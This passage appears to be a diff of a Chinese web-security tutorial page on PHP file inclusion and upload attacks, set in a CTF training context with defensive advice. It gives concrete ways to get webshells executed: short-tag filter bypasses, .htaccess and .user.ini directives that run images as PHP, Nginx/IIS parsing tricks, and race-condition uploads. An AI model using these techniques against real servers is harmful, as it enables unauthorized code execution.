+          服务器看到 <code>.jpg</code> 就当图片发出去，不会解析里面的 PHP。
+        </p>
+        <p>
+          它的正经用法是<strong>配合文件包含</strong>：
+          <code>?file=upload/shell.jpg</code>，包含一下，里面那段 PHP 就执行了。
+        </p>
+        <p>这就是这一讲为什么把两块放在一起：单独都不致命，合起来就通了。</p>
+      </div>
+
+      <h3>第五层：短标签</h3>
+
+      <p>
+        如果 <code>eval</code>、<code>system</code> 这些词被过滤了，试试换标记方式：
+      </p>
+
+      <pre><code>&lt;? echo '123'; ?&gt;            // short_open_tag = on
+&lt;?=(表达式)?&gt;                // 等价于 &lt;?php echo ...?&gt;
+&lt;% echo '123'; %&gt;            // asp_tags = on，PHP 7 以下
+&lt;script language="php"&gt;...&lt;/script&gt;  // PHP 7 以下</code></pre>
+
+      <p>
+        短标签在文件包含里特别有用 —— 有些过滤器只认 <code>&lt;?php</code>，
+        换个写法就绕过去了。
+      </p>
+
+
+      <h2 id="s-parse">解析漏洞：让非 PHP 文件被执行</h2>
+
+      <p>
+        实在传不了 <code>.php</code>，那就换个思路：
+        <strong>让服务器把别的后缀也当 PHP 执行。</strong>
+      </p>
+
+      <h3>.htaccess</h3>
+
+      <p>
+        Apache 的目录级配置文件。传一个叫 <code>.htaccess</code> 的文件（开头的点别丢），
+        就能改变这个目录的解析规则：
+      </p>
+
+      <pre><code>&lt;IfModule mime_module&gt;
+    SetHandler application/x-httpd-php
+&lt;/IfModule&gt;</code></pre>
+
+      <p>这行的意思是：这个目录下<strong>所有文件</strong>都按 PHP 解析。想精准点：</p>
+
+      <pre><code>AddType application/x-httpd-php .jpg</code></pre>
+
+      <p>只让 <code>.jpg</code> 当 PHP 跑。</p>
+
+      <p>
+        流程：传 <code>.htaccess</code> → 传一个黑名单外的文件（内容换成木马）→ 访问它 → 执行。
+      </p>
+
+      <p>
+        <strong>利用条件</strong>：服务器没禁止上传 <code>.htaccess</code>，
+        且允许用户自定义配置。
+      </p>
+
+      <h3>.user.ini</h3>
+
+      <p>
+        PHP 5.3.0 之后的配置文件，作用类似但专门管 PHP。两个关键项：
+      </p>
+
+      <pre><code>auto_prepend_file = &lt;filename&gt;    // 自动包含在文件头
+auto_append_file  = &lt;filename&gt;    // 自动包含在文件尾</code></pre>
+
+      <p>
+        流程：传 <code>.user.ini</code>（内容 <code>auto_prepend_file = 1.jpg</code>）→
+        传 <code>1.jpg</code>（内容是木马）→
+        <strong>访问同目录下任意一个 php 文件</strong>，木马就被自动包含执行了。
+      </p>
+
+      <p>
+        <strong>利用条件</strong>：目标目录下至少要有一个 php 文件。
+      </p>
+
+      <h3>Nginx 的路径修复</h3>
+
+      <p>
+        这个跟 PHP 的一个配置项 <code>cgi.fix_pathinfo</code> 有关，默认是 <code>1</code>（开启）。
+      </p>
+
+      <p>
+        访问 <code>/test.jpg/test.php</code> 时：Nginx 看到后缀是 <code>.php</code>，转给 PHP；
+        PHP 发现 <code>/test.jpg/test.php</code> 不存在，就<strong>从前到后修路径</strong> ——
+        去掉 <code>/test.php</code>，发现 <code>/test.jpg</code> 存在，就把它当脚本执行。
+      </p>
+
+      <p>
+        所以：传一个 <code>1.jpg</code>（内容含 PHP），访问 <code>1.jpg/2.php</code>，就能执行。
+      </p>
+
+      <p>
+        <code>cgi.fix_pathinfo=1</code> 的行为是：遇到
+        <code>/1.jpg/2.txt/3.php</code> 不存在，就一层层往前削，直到找到存在的那个文件。
+      </p>
+
+      <h3>IIS 6 / 7 的老姿势</h3>
+
+      <ul>
+        <li><strong>IIS 6 分号截断</strong>：<code>1.asp;.jpg</code></li>
+        <li><strong>IIS 6 目录解析</strong>：<code>1.asp/1.jpg</code></li>
+        <li><strong>IIS 7.0 / 7.5</strong>：访问 <code>/upload/1.jpg/.php</code>，IIS 把 <code>.php</code> 之前的部分当脚本、<code>.php</code> 当 PATH_INFO，于是 <code>1.jpg</code> 被当 PHP 执行</li>
+      </ul>
+
+      <p>这些都是老环境里的东西，遇到了再查，不用背。</p>
+
+
+      <h2 id="s-race">条件竞争：赌那个毫秒级的窗口</h2>
+
+      <p>
+        有的代码逻辑是这样：
+      </p>
+
+      <ol>
+        <li>先把文件<strong>原样存下来</strong></li>
+        <li>然后检查后缀</li>
+        <li>合规就重命名，不合规就<strong>删掉</strong></li>
+      </ol>
+
+      <p>
+        看起来没问题？问题在于第 1 步和第 3 步之间有个时间窗口。
+        在这段时间里，那个文件<strong>已经存在、而且能被访问</strong>。
+      </p>
+
+      <p>所以三种情况：</p>
+
+      <ul>
+        <li>在存下来之前访问 → 没这个文件</li>
+        <li><strong>存下来之后、删除之前访问 → 文件在，执行成功</strong></li>
+        <li>删除之后访问 → 没这个文件</li>
+      </ul>
+
+      <p>
+        打法：<strong>Burp 开两个 Intruder 同时跑</strong>，
+        一个不停上传，一个不停访问目标路径，赛跑。
+      </p>
+
+      <p>
+        这叫<strong>条件竞争（Race Condition）</strong>。
+        窗口可能只有几十毫秒，所以请求量要大、要并发。
+      </p>
+
+      <div class="note">
+        <span class="note-tag">这类洞的共同点</span>
+        <p>
+          条件竞争不只是文件上传才有。凡是"先做一件事、后做检查"的逻辑，
+          中间都有缝 —— 领优惠券、转账、改密码、下载文件，都是同一个模型。
+        </p>
+        <p><strong>修法是加锁</strong>：保证一个进程在操作某资源时，别的进程进不来。</p>
+      </div>
+
+
+      <h2 id="s-defend">防御</h2>
+
+      <h3>文件包含的防御</h3>
+
+      <table>
+        <thead><tr><th style="width:12rem">措施</th><th>说明</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code>open_basedir</code></td>
+            <td>限制 PHP 能访问的目录范围。注意<strong>限制的是前缀不是目录</strong>：
+              <code>/dir/user</code> 这个配置下，<code>/dir/user1</code> 也能访问 ——
+              想严格限制，路径要以斜线结尾</td>
+          </tr>
+          <tr>
+            <td>权限管理</td>
+            <td>敏感文件（日志、配置）不给 Web 用户读权限</td>
+          </tr>
+          <tr>
+            <td>白名单</td>
+            <td>只允许包含指定目录、指定后缀的文件</td>
+          </tr>
+          <tr>
+            <td>关 <code>allow_url_fopen</code> / <code>allow_url_include</code></td>
+            <td>能挡大部分远程包含，<strong>但挡不住 file://、php://filter、日志包含</strong></td>
+          </tr>
+          <tr>
+            <td>不用动态包含</td>
+            <td>最根本的一条：别让 <code>$_GET</code> 参与路径</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="note pit">
+        <span class="note-tag">open_basedir 能被软链接绕过</span>
+        <p>
+          软链接（类似快捷方式）指向外面的目录，PHP 跟着走就出去了。
+          所以它也不是铁板一块，只是提高门槛。
+        </p>
+      </div>
+
+      <h3>文件上传的防御</h3>
+
+      <table>
+        <thead><tr><th style="width:12rem">措施</th><th>说明</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>白名单</td>
+            <td>只允许特定后缀，<strong>白名单永远比黑名单可靠</strong></td>
+          </tr>
+          <tr>
+            <td>重命名</td>
+            <td>用 <code>uniqid()</code> 之类生成随机名，<strong>且不回显</strong>。
+              这样你不知道文件叫什么，也就访问不到。同理可以生成随机目录</td>
+          </tr>
+          <tr>
+            <td>控制权限</td>
+            <td>上传目录<strong>不给执行权限</strong>。要用文件内容就走脚本读取，别让 Web 直接执行</td>
+          </tr>
+          <tr>
+            <td>禁用危险配置</td>
+            <td>上传目录里把 <code>.php</code> 等当纯文本；关掉 <code>cgi.fix_pathinfo</code></td>
+          </tr>
+          <tr>
+            <td>压缩图片</td>
+            <td>重新编码一遍，把藏在里面的恶意代码破坏掉</td>
+          </tr>
+          <tr>
+            <td>进程锁</td>
+            <td>防条件竞争</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <pre><code>&lt;Directory "/uploads"&gt;
+    Options -ExecCGI
+    AddType text/plain .php .asp .jsp
+&lt;/Directory&gt;</code></pre>
+
+      <p>
+        这段 Apache 配置的意思是：上传目录里，<code>.php</code> / <code>.asp</code> / <code>.jsp</code>
+        全部当作纯文本，不许执行。
+      </p>
+
+
+      <h2 id="s-homework">作业</h2>
+
+      <p>勾上就会记在本机，下次打开还在。</p>
+
+      <ul class="checkable">
+        <li>
+          <input type="checkbox" id="hw1" data-k="file-lab">
+          <label for="hw1"><strong>打通文件靶场四关。</strong>
+          两关包含（其中一关有前缀）、两关上传（其中一关查 Content-Type）。
+          一关关来，别跳。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw2" data-k="upload-labs">
+          <label for="hw2"><strong>upload-labs 前 8 关。</strong>
+          传上去的文件默认存在 <code>upload-lab/upload</code>，
+          能执行系统命令就算过。<strong>每关做完记得点右上角清空上传文件</strong>，不然下一关会被影响。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw3" data-k="buu-include">
+          <label for="hw3"><strong>BUUCTF：[newstar2023] Week2 Include 0.0 和 Week3 Include 🍐。</strong>
+          两道文件包含的题，看看你是怎么找路径的。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw4" data-k="ctfshow4">
+          <label for="hw4"><strong>（选做）ctfshow web4。</strong>
+          日志包含那道经典题。提示：想想 UA 能不能写进去。</label>
+        </li>
+      </ul>
+
+      <div class="note">
+        <span class="note-tag">本地跑不起来怎么办</span>
+        <p>
+          有些题目在 phpstudy 下会失败，因为默认配置比较"安全"，
+          把漏洞点给修了（比如 <code>allow_url_include</code> 是关的）。
+        </p>
+        <p>
+          两个办法：去 BUU 上做（环境是他们配好的），
+          或者在 Linux 上拉个 docker 镜像下来。
+        </p>
+      </div>
+
+      <div class="note">
+        <span class="note-tag">下一讲会讲什么</span>
+        <p>
+          大概率是 <strong>RCE / 命令执行</strong>。这一讲的"花式木马"那里埋了个伏笔 ——
+          命令执行那一讲会展开讲各种绕过 <code>disable_functions</code> 的姿势。
+        </p>
+      </div>
+
+
+    </div>
+
+    <section class="teahouse" id="teahouse">
+      <div class="teahouse-head">
+        <h2>茶寮</h2>
+        <span class="sub">卡住的地方、踩过的坑，留个话，别人也看得到</span>
+      </div>
+      <div id="comments-mount"></div>
+    </section>
+
+  </article>
+
+  <aside class="side">
+    <div class="side-block">
+      <h4>本卷目录</h4>
+      <ul class="side-toc">
+        <li><a href="#s-intro">这一讲在讲什么</a></li>
+        <li><a href="#s-inc">一 · 文件包含</a></li>
+        <li><a href="#s-shell">二 · 一句话木马</a></li>
+        <li><a href="#s-trick">三 · 日志/Session/伪协议</a></li>
+        <li><a href="#s-inc-bypass">四 · 包含的绕过</a></li>
+        <li><a href="#s-upload">五 · 文件上传</a></li>
+        <li><a href="#s-up-bypass">六 · 上传绕过</a></li>
+        <li><a href="#s-parse">七 · 解析漏洞</a></li>
+        <li><a href="#s-race">八 · 条件竞争</a></li>
+        <li><a href="#s-defend">九 · 防御</a></li>
+        <li><a href="#s-homework">十 · 作业</a></li>
+      </ul>
+    </div>
+
+    <div class="side-block">
+      <h4>读了几成</h4>
+      <div class="progress-ring" data-progress-ring>
+        <svg width="42" height="42" viewBox="0 0 36 36" aria-hidden="true">
+          <circle class="ring-bg" cx="18" cy="18" r="15.5" fill="none" stroke-width="2"></circle>
+          <circle class="ring-fg" cx="18" cy="18" r="15.5" fill="none" stroke-width="2"
+                  stroke-linecap="round" transform="rotate(-90 18 18)"
+                  style="stroke-dasharray:97.39;stroke-dashoffset:97.39"></circle>
+        </svg>
+        <span class="num"><b data-progress-num>0/0</b>作业打了勾</span>
+      </div>
+    </div>
+  </aside>
+
+</main>
+
+<footer class="site-foot">
+  <p class="colophon">竹隐 &middot; 其四 &middot; 文件包含与文件上传</p>
+  <p class="colophon">所有实操请在自己机器或授权范围内进行。</p>
+</footer>
+
+<button class="to-top" type="button" aria-label="回到卷首">&uarr;</button>
+
+<script src="../assets/js/site-config.js"></script>
+<script src="../assets/js/comments.js"></script>
+<script src="../assets/js/site.js"></script>
+</body>
+</html>
